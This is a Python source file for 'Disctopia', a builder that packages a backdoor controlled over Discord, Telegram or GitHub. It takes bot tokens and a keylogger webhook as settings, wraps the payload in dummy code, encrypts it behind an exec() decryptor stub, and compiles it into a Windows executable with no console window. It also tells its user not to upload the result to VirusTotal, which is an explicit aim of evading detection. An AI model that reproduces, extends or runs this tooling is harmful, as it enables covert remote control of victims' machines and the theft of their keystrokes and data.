# -*- coding: utf-8 -*-

import json
import subprocess
import os
import argparse
import distro
from prettytable import PrettyTable
from sys import platform as OS
import requests
import time
import sys
import random
import string
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def clear_screen():
    if OS == "linux" or OS == "linux2":
        os.system("clear")
    elif OS == "darwin":  # macOS
        os.system("clear")
    elif OS == "win32":  # Windows
        os.system("cls")

clear_screen()

print('''
▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
 ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
 ░                   ░                                                 

Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis \n\nRun 'help use' to get started!''')

# Function to generate random strings for key generation or dummy code
def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Dummy function to generate additional code for obfuscation
def generate_dummy_code(lines=10):
    dummy_code = []
    for _ in range(lines):
        dummy_code.append(f"def dummy_{random_string(5)}():\n    x = {random.randint(1, 1000)}\n    return x * {random.randint(1, 100)}\n")
    return "\n".join(dummy_code)

# Function to obfuscate code (placeholder for more complex obfuscation)
def obfuscate_code(code):
    dummy_code = generate_dummy_code(5)
    obfuscated = f"{dummy_code}\n\n# Obfuscated payload\n{code}\n\n{dummy_code}"
    return obfuscated

# Function to encrypt payload code
def encrypt_payload(code, key):
    f = Fernet(base64.urlsafe_b64encode(key))
    return f.encrypt(code.encode()).decode()

# Function to create a decryptor stub for the encrypted payload
def create_decryptor_stub(encrypted_payload, encryption_key):
    stub_code = f"""
import base64
from cryptography.fernet import Fernet

# Encrypted payload
encrypted_payload = "{encrypted_payload}"

# Decryption key
key = {repr(base64.urlsafe_b64encode(encryption_key))}
f = Fernet(key)

# Decrypt and execute
exec(f.decrypt(encrypted_payload.encode()).decode())
"""
    return stub_code

# Function to determine PyInstaller path or alternative based on platform
def get_compiler_command(stub_file, output_name):
    base_command = ["--onefile", "--name", output_name]  # Core PyInstaller options
    if OS == "win32":  # Windows (native or WSL)
        if "microsoft" in distro.name().lower() or "wsl" in os.environ.get("WSL_DISTRO_NAME", "").lower():
            print("[+] Detected WSL environment on Windows")
            pyinstaller_cmd = "pyinstaller"
            compile_command = [pyinstaller_cmd] + base_command + ["--noconsole", "--icon=img/exe_file.ico", stub_file]
        else:
            print("[+] Detected native Windows environment")
            pyinstaller_cmd = "pyinstaller"
            compile_command = [pyinstaller_cmd] + base_command + ["--noconsole", "--icon=img/exe_file.ico", stub_file]
    elif OS == "linux" or OS == "linux2":  # Linux (including Kali)
        print("[+] Detected Linux environment")
        wine_pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
        if not os.path.exists(wine_pyinstaller_path):
            wine_pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
        if os.path.exists(wine_pyinstaller_path):
            compile_command = ["wine", wine_pyinstaller_path] + base_command + ["--noconsole", "--icon=img/exe_file.ico", stub_file]
        else:
            print("[!] Wine PyInstaller not found, falling back to native PyInstaller...")
            compile_command = ["pyinstaller"] + base_command + ["--noconsole", stub_file]
    elif OS == "darwin":  # macOS
        print("[+] Detected macOS environment")
        print("[!] macOS compilation to Windows EXE requires Wine for cross-compilation.")
        try:
            subprocess.run(["wine", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("[+] Wine detected on macOS, attempting cross-compilation...")
            wine_pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
            if os.path.exists(wine_pyinstaller_path):
                compile_command = ["wine", wine_pyinstaller_path] + base_command + ["--noconsole", "--icon=img/exe_file.ico", stub_file]
            else:
                print("[!] Wine PyInstaller path not found, falling back to native PyInstaller...")
                compile_command = ["pyinstaller"] + base_command + ["--noconsole", stub_file]
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[!] Wine not installed. Building a macOS app bundle instead.")
            compile_command = ["pyinstaller"] + base_command + ["--noconsole", stub_file]
    else:
        print("[!] Unsupported OS detected. Attempting compilation with PyInstaller.")
        compile_command = ["pyinstaller"] + base_command + ["--noconsole", stub_file]
    return compile_command

# Initialize configuration list and payload
config_list = ["None", "None", "None", "None", "None"]
payload = ""

def createTable(config_list):
    table = PrettyTable(["Setting", "Value"])
    table.add_row(["Backdoor Name", config_list[0]])

    if payload == "discord":
        table.add_row(["Guild ID", config_list[1]])
        table.add_row(["Bot Token", config_list[2]])
        table.add_row(["Channel ID", config_list[3]])
        table.add_row(["Keylogger Webhook", config_list[4]])
    elif payload == "telegram":
        table.add_row(["User ID", config_list[1]])
        table.add_row(["Bot Token", config_list[2]])
    elif payload == "github":
        table.add_row(["Github Token", config_list[1]])
        table.add_row(["Github Repo", config_list[2]])
    return table

# Main command loop
try:
    while True:
        command = input(f"[+] {payload if payload else ''} > ")
        command_list = command.split()

        if command_list == []:
            continue

        elif command_list[0] == "exit":
            print("\n[+] Exiting!")
            exit()

        elif command_list[0] == "use":
            if len(command_list) == 1:
                print("[!] Please specify a payload!")
            else:
                if command_list[1] == "discord":
                    print("[+] Using Discord C2")
                    payload = "discord"
                    table = createTable(config_list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                elif command_list[1] == "telegram":
                    print("[+] Using Telegram C2")
                    payload = "telegram"
                    table = createTable(config_list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                elif command_list[1] == "github":
                    print("[+] Using Github C2")
                    payload = "github"
                    table = createTable(config_list)    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                else:
                    print("[!] Invalid payload!")

        elif command_list[0] == "set":
            if len(command_list) < 3:
                print("[!] Please specify a setting!\n")
            else:
                if command_list[1] == "name":
                    config_list[0] = command_list[2]
                elif command_list[1] == "guild-id":
                    config_list[1] = command_list[2]
                elif command_list[1] == "bot-token":
                    config_list[2] = command_list[2]
                elif command_list[1] == "channel-id":
                    config_list[3] = command_list[2]
                elif command_list[1] == "user-id":
                    config_list[1] = command_list[2]
                elif command_list[1] == "github-token":
                    config_list[1] = command_list[2]
                elif command_list[1] == "github-repo":
                    config_list[2] = command_list[2]
                elif command_list[1] == "webhook":
                    config_list[4] = command_list[2]
                else:
                    print("[!] Invalid setting!\n")

        elif command_list[0] == "config":
            if payload == "":
                print("[!] Please select a payload!\n")
            else:
                table = createTable(config_list)
                print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                print("Run 'help set' for more information\n")

        elif command_list[0] == "clear":
            clear_screen()

        elif command_list[0] == "help":
            if len(command_list) == 1:
                print('''\n
        Help Menu:
        "help <command>" Displays more help for a specific command 
        "use <payload>" Selects a payload to use
        "set <setting> <value>" Sets a value to a valid setting
        "config" Shows the settings and their values
        "build" Packages the backdoor into an EXE file
        "update" Gets the latest version of Disctopia
        "exit" Terminates the builder
                    \n''')
            else:
                if command_list[1] == "use":
                    print('''\n
        Help Menu:
        "use <payload>" Selects a payload to use
        Payloads:
        "discord" - A Discord based C2
        "telegram" - A telegram based C2
        "github" - A github based C2
                        ''')
                elif command_list[1] == "set":
                    if payload == "":
                        print("[!] Please select a payload!\n")
                    else:
                        if payload == "discord":
                            print('''\n
        Help Menu:
        "set <setting> <value>" Sets a value to a valid setting
        Settings:
        "name" - The name of the backdoor
        "guild-id" - The ID of the Discord server
        "bot-token" - The token of the Discord bot
        "channel-id" - The ID of the Discord channel
        "webhook" - The webhook for the keylogger
                            ''')
                        elif payload == "telegram":
                            print('''\n
        Help Menu:
        "set <setting> <value>" Sets a value to a valid setting
        Settings:
        "name" - The name of the backdoor
        "bot-token" - The token of the Telegram bot
        "user-id" - The ID of the Telegram user
        IMPORTANT: This can only be used with one agent online at a time!
                            ''')
                        elif payload == "github":
                            print('''\n
        Help Menu:
        "set <setting> <value>" Sets a value to a valid setting
        Settings:
        "name" - The name of the backdoor
        "github-token" - The token of the Github bot
        "github-repo" - The name of the Github repo
                            ''')
                elif command_list[1] in ["build", "update", "exit", "config", "clear"]:
                    print("[!] There is nothing more to show!\n")
                else:
                    print("[!] Invalid command!\n")

        elif command_list[0] == "build":
            if payload == "":
                print("[!] Please select a payload!\n")
                continue
            print("[?] Are you sure you want to build the backdoor? (y/n)")
            user_input = input()
            if user_input.lower() == "y":
                print("[+] Building backdoor...")
                if payload == "discord":
                    try:
                        with open("code/discord/main.py", 'r') as f:
                            file = f.read()
                        newfile = file.replace("{GUILD}", str(config_list[1]))
                        newfile = newfile.replace("{TOKEN}", str(config_list[2]))
                        newfile = newfile.replace("{CHANNEL}", str(config_list[3]))
                        newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(config_list[4]))
                    except FileNotFoundError:
                        print("[!] Discord payload template not found. Ensure 'code/discord/main.py' exists.")
                        continue
                elif payload == "telegram":
                    try:
                        with open("code/telegram/main.py", 'r') as f:
                            file = f.read()
                        newfile = file.replace("{BOT_TOKEN}", str(config_list[2]))
                        newfile = newfile.replace("{USER_ID}", str(config_list[1]))
                    except FileNotFoundError:
                        print("[!] Telegram payload template not found. Ensure 'code/telegram/main.py' exists.")
                        continue
                elif payload == "github":
                    try:
                        with open("code/github/main.py", 'r') as f:
                            file = f.read()
                        newfile = file.replace("{TOKEN}", str(config_list[1]))
                        newfile = newfile.replace("{REPO}", str(config_list[2]))
                    except FileNotFoundError:
                        print("[!] GitHub payload template not found. Ensure 'code/github/main.py' exists.")
                        continue

                # Step 1: Obfuscate the code
                print("[+] Obfuscating payload code...")
                obfuscated_code = obfuscate_code(newfile)

                # Step 2: Encrypt the payload
                print("[+] Encrypting payload...")
                salt = os.urandom(16)
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000,
                )
                encryption_key = kdf.derive(random_string(20).encode())
                encrypted_payload = encrypt_payload(obfuscated_code, encryption_key)

                # Step 3: Create the final stub with decryptor
                print("[+] Generating polymorphic stub...")
                final_stub = create_decryptor_stub(encrypted_payload, encryption_key)

                # Step 4: Write the final stub to a temporary file
                stub_file = config_list[0] + ".py"
                with open(stub_file, 'w') as f:
                    f.write(final_stub)

                # Step 5: Compile the stub to executable based on platform
                print("[+] Compiling to executable...")
                compile_command = get_compiler_command(stub_file, config_list[0])
                print(f"[+] Running command: {' '.join(compile_command)}")

                try:
                    result = subprocess.run(compile_command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    print("[+] Compilation output:")
                    print(result.stdout)
                    if result.stderr:
                        print("[!] Compilation errors/warnings:")
                        print(result.stderr)

                    if os.path.exists(stub_file):
                        os.remove(stub_file)
                    spec_file = config_list[0] + ".spec"
                    if os.path.exists(spec_file):
                        os.remove(spec_file)

                    dist_path = os.path.join("dist", config_list[0] + (".exe" if OS == "win32" else ""))
                    if os.path.exists(dist_path):
                        print(f'\n[+] Backdoor successfully built at: {dist_path}')
                        print('\n[+] Encryption and obfuscation applied successfully')
                    else:
                        print(f'\n[!] Compilation failed: Executable not found at {dist_path}')
                        print('[!] Check PyInstaller installation and platform compatibility.')
                except subprocess.CalledProcessError as e:
                    print(f"[!] Compilation failed with error: {e.stderr}")
                    print("[!] Ensure PyInstaller and necessary tools (e.g., Wine on Linux/macOS for EXE) are installed for your platform.")
                except FileNotFoundError as e:
                    print(f"[!] Error during compilation: {e}")
                    print("[!] PyInstaller or Wine not found. Install the required tools for your platform.")
                except Exception as e:
                    print(f"[!] Unexpected error during compilation: {e}")
                finally:
                    if os.path.exists(stub_file):
                        os.remove(stub_file)
                    spec_file = config_list[0] + ".spec"
                    if os.path.exists(spec_file):
                        os.remove(spec_file)
                    print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
                    exit()

        elif command_list[0] == "update":
            url = 'https://api.github.com/repos/3ct0s/disctopia-c2/releases/latest'
            response = requests.get(url)
            latest_tag = response.json()['tag_name']

            cmd = ['git', 'describe', '--tags']
            current_tag = subprocess.check_output(cmd).decode('utf-8').strip()

            if current_tag == latest_tag:
                print('[!] Code is up to date')
            else:
                print('[!] Updating code...')
                cmd = ['git', 'reset', '--hard', 'HEAD']
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                cmd = ['git', 'fetch', '--tags', '--prune']
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                cmd = ['git', 'pull', '--ff-only']
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                cmd = ['git', 'checkout', latest_tag]
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f'[!] Code has been updated to {latest_tag}')
                print('[*] Quitting...')
                exit()

        else:
            print("[!] Invalid command!\n")

except KeyboardInterrupt:
    print("\n\n[+] Exiting")
except Exception as e:
    print(f"[!] Unexpected error: {e}")
    print("[+] Exiting")
